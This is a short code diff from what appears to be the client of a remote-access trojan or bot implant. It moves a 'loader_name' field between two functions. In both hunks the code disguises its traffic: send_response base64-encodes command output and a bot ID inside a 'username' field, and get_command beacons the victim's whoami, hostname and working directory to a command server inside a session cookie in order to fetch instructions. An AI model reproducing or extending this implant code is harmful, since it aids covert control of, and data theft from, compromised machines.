@@ -192,8 +192,7 @@ def send_response(response, module_name="", response_options=""):
     headers = {"User-Agent": USER_AGENT}
     data = urlencode({"username": b64encode(json.dumps(
         {"response": b64encode(response),
-         "bot_uid": get_uid(), "loader_name": LOADER_OPTIONS["loader_name"],
-         "module_name": module_name, "response_options": response_options}
+         "bot_uid": get_uid(), "module_name": module_name, "response_options": response_options}
     ))})
 
     try:
@@ -217,7 +216,8 @@ def get_command():
         "Cookie": "session=" + b64encode(get_uid()) + "-" +
                   b64encode(json.dumps({
                       "type": RequestType.GET_COMMAND, "username": run_command("whoami"),
-                      "hostname": run_command("hostname"), "path": run_command("pwd")
+                      "hostname": run_command("hostname"), "path": run_command("pwd"),
+                      "loader_name": LOADER_OPTIONS["loader_name"]
         }))
     }
     response = ""
